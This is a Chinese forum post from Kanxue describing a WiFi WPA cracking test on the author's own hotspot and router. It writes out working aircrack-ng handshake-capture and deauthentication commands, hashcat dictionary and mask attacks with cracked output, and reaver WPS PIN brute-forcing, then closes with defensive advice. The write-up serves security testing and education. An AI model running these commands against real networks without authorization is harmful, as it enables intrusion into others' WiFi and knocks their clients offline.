> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-291160.htm)

> 看雪安全社区是一个非营利性质的技术交流平台，致力于汇聚全球的安全研究者和开发者，专注于软件与系统安全、逆向工程、漏洞研究等领域的深度技术讨论与合作。

> 本文记录一次完整的 WiFi 安全测试过程，涵盖环境搭建、握手包抓取、GPU 密码破解与分析。  
> **所有测试仅在自有网络和测试热点上进行，未经授权入侵他人网络属于违法行为。**

网上搜 "WiFi 破解工具"，结果一堆一键破解神器——下载下来要么是玩具（用 netsh 逐个试密码，3 次 / 秒），要么直接是病毒。实际跑通一条从抓包到破解的完整链路有多难？决定亲自验证。

**测试环境：** 主板内置 Intel AX211 网卡 + 外购 USB 监听网卡（RT3070 芯片）、RTX 5060 Ti 16GB GPU。

**自我约束：** 只测试手机热点（自己开的）和自有路由器（CMCC-xxxx）。所有过程不涉及第三方网络。

<table><thead><tr><th>组件</th><th>型号</th><th>备注</th></tr></thead><tbody><tr><td>GPU</td><td>NVIDIA RTX 5060 Ti 16GB</td><td>CUDA 13.2</td></tr><tr><td>USB 网卡</td><td>RT3070 (Ralink 芯片)</td><td>18 元, 2.4GHz</td></tr><tr><td>宿主机</td><td>Windows</td><td>跑 hashcat</td></tr></tbody></table>

<table><thead><tr><th>工具</th><th>用途</th><th>平台</th></tr></thead><tbody><tr><td>hashcat 7.1.2</td><td>GPU 密码破解</td><td>Windows</td></tr><tr><td>VirtualBox + Kali Linux</td><td>抓握手包</td><td>虚拟机</td></tr><tr><td>aircrack-ng</td><td>WiFi 扫描 / 抓包 / deauth</td><td>Kali</td></tr></tbody></table>

1.  **hashcat 必须在自己的目录下运行**，依赖 `OpenCL/` 文件夹
2.  **Kali VM 需要 USB 直通** — 菜单 "设备→USB→勾选网卡"
3.  **RT3070 在 USB 3.0（蓝色口）上非常不稳**，插 USB 2.0（黑色 / 白色）口才正常
4.  **airmon-ng 和 NetworkManager 冲突**，抓包前必须 `airmon-ng check kill`
5.  **抓包时需要客户端在线**，目标没人的话把自己手机断开重连即可触发握手

```
hashcat (v7.1.2) benchmark - Mode 22000 (WPA-PBKDF2-PMKID+EAPOL)
Speed: ~697 kH/s (69.7万次/秒)
GPU: NVIDIA GeForce RTX 5060 Ti


```

**密码空间估算（8 位密码）：**

<table><thead><tr><th>字符集</th><th>规模</th><th>速度</th><th>完整遍历耗时</th></tr></thead><tbody><tr><td>纯数字 (10)</td><td>1 亿</td><td>697kH/s</td><td>~ 最长 2.5 分钟</td></tr><tr><td>数字 + 小写字母 (36)</td><td>2.8 万亿</td><td>697kH/s</td><td>~ 最长 54 天</td></tr><tr><td>数字 + 大小写 + 特殊 (72)</td><td>722 万亿</td><td>697kH/s</td><td>~ 最长 37 年</td></tr></tbody></table>

> 结论：8 位以上无规律密码单 GPU 暴力破解不可行。实战依赖字典、规则和掩码的智能组合。

```
sudo airmon-ng start wlan0


sudo airodump-ng wlan0mon --band bg


sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w ~/capture wlan0mon


sudo aireplay-ng --deauth 5 -a XX:XX:XX:XX:XX:XX wlan0mon


```

**成功标志：** 抓包窗口右上角出现 `WPA handshake`。

![](https://bbs.kanxue.com/upload/attach/202605/994967_8Y8TCGDNHF6Y9GP.webp)  
![](https://bbs.kanxue.com/upload/attach/202605/994967_3PEBWMTBDYVGU8Q.webp)  
![](https://bbs.kanxue.com/upload/attach/202605/994967_Z75YPGF9S2QMNQU.webp)  
-- 这里网卡过热了，设备老是掉线 没截图到相关截图，但是看文档应该足够了  
-- 锁定目标、开始抓包（-c 频道, --bssid 目标 MAC, -w 保存路径）  
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w ~/capture wlan0mon  
-- 另开终端，踢掉客户端触发握手（这里主要是触发握手包，我们拿到好算结果是否正确，正确即爆破成功）  
sudo aireplay-ng --deauth 5 -a XX:XX:XX:XX:XX:XX wlan0mon

-- 这是抓到的文件，进行转换  
![](https://bbs.kanxue.com/upload/attach/202605/994967_WRGX72KBX9VTC4B.webp)

```
hcxpcapngtool -o target.hc22000 capture-03.cap


```

将 `.hc22000` 文件传到 Windows 宿主机，用 hashcat 运行：

#### 字典攻击

```
.\hashcat.exe -m 22000 target.hc22000 rockyou.txt -r rules\best66.rule -O -w 3


```

rockyou.txt 包含 1434 万条真实泄露密码, 配合 best66 变形规则，覆盖大量常见弱密码。

#### 掩码暴力（按已知规律缩小范围）

```
# 8位纯数字
.\hashcat.exe -m 22000 target.hc22000 -a 3 ?d?d?d?d?d?d?d?d -O -w 3

# 字母+数字混合（用自定义字符集）
.\hashcat.exe -m 22000 target.hc22000 -a 3 -1 "?l?d" "?1?1?1?1?1?1?1?1" -O -w 3


```

*   **密码类型：** 8 位纯数字 `88885555`
*   **抓包：** airodump-ng + 手机手动重连触发握手
*   **破解：** 8 位纯数字掩码 `?d?d?d?d?d?d?d?d`
*   **结果：** 10 秒破解，进度 7.23%

```
Status...........: Cracked
Speed............: 715 kH/s
Recovered........: 1/1 (100.00%)
Time.............: 10 secs
Password.........: 88885555


```

> 全链路验证通过：网卡抓包 → 格式转换 → GPU 破解 → 出密码。

*   **信号：** -33dBm（强）
*   **客户端：** 2 个在线
*   **默认密码：** `takg7f6y`（已修改）
*   **新密码特征：** 字母 + 数字混合 8 位

_**初期尝试：**_

<table><thead><tr><th>攻击方式</th><th>结果</th></tr></thead><tbody><tr><td>自定义中文手机号 / 生日字典 (22.6 万条)</td><td>字典耗尽，未命中</td></tr><tr><td><code>cmcc?a?a?a?a</code> 掩码</td><td>8145 万条遍历完毕，未命中</td></tr><tr><td>8 位纯数字掩码</td><td>1 亿条遍历完毕，未命中</td></tr><tr><td>72 字符全掩码</td><td>722 万亿，估计 37 年，放弃</td></tr></tbody></table>

_**最终成功：**_

下载 rockyou.txt（1434 万真实泄露密码），配合 best66 规则变形：

```
.\hashcat.exe -m 22000 target.hc22000 -a 0 rockyou.txt -r rules\best66.rule


```

```
Status...........: Cracked
Speed............: 649.3 kH/s
Recovered........: 1/1 (100.00%)
Progress.........: 2.31%
Password.........: abcd1234
Time.............: <1 秒


```

> `abcd1234` 是典型键盘模式 + 简单数字。即使是未在字典中精确存在的变形，规则引擎也能命中。

802.11 协议的管理帧是明文且无签名验证的。攻击者伪造路由器 MAC 发送 Disassociation 帧即可强制客户端断开连接。

用途：迫使客户端重连从而抓取握手包。

```
sudo aireplay-ng --deauth 5 -a <AP_MAC> -c <Client_MAC> wlan0mon


sudo aireplay-ng --deauth 0 -a <AP_MAC> -c <Client_MAC> wlan0mon


sudo aireplay-ng --deauth 10 -a <AP_MAC> wlan0mon


```

802.11w (PMF) 标准可以防护，但大多数家用路由器默认关闭。

WPS 功能如果开启且未做锁定保护，可通过暴力尝试 8 位 PIN 码（实际只需 11000 次）获取密码：

```
sudo wash -i wlan0mon


sudo reaver -i wlan0mon -b <AP_MAC> -c <频道> -vv


```

安全建议：在路由器管理页面关闭 WPS 功能。

通过这次测试，总结以下防御措施：

<table><thead><tr><th>措施</th><th>抵挡的攻击</th></tr></thead><tbody><tr><td><strong>密码 12 位以上，含大小写 + 数字 + 符号</strong></td><td>GPU 暴力破解不可行</td></tr><tr><td><strong>不用键盘模式 / 单词 + 数字</strong></td><td>字典攻击失效</td></tr><tr><td><strong>关闭 WPS</strong></td><td>WPS PIN 攻击失效</td></tr><tr><td><strong>开启 802.11w (PMF)</strong></td><td>Deauth 攻击失效</td></tr><tr><td><strong>定期查看已连接设备</strong></td><td>发现蹭网设备</td></tr></tbody></table>

> 一个 12 位随机密码（大小写 + 数字 + 符号），即使用 10 张 RTX 4090 跑几辈子也破不了。

本文涉及的脚本和配置文件均在工程目录下：

<table><thead><tr><th>文件</th><th>用途</th></tr></thead><tbody><tr><td><code>wifi_crack_sim.py</code></td><td>Windows 在线扫描 + 字典测试</td></tr><tr><td><code>wifi_crack_fullauto.py</code></td><td>Linux 全自动抓包 / Windows 破解已有包</td></tr><tr><td><code>setup_vm.py</code></td><td>Kali VM 一键部署</td></tr><tr><td><code>wordlists/common_cn.txt</code></td><td>中国弱密码字典生成脚本</td></tr><tr><td><code>wordlists/rockyou.txt</code></td><td>1434 万真实泄露密码字典</td></tr><tr><td><code>tools/hashcat/</code></td><td>hashcat 7.1.2 + CUDA</td></tr><tr><td><code>output/</code></td><td>破解结果输出</td></tr></tbody></table>

[传播安全知识、拓宽行业人脉——看雪讲师团队等你加入！](https://bbs.kanxue.com/thread-275828.htm)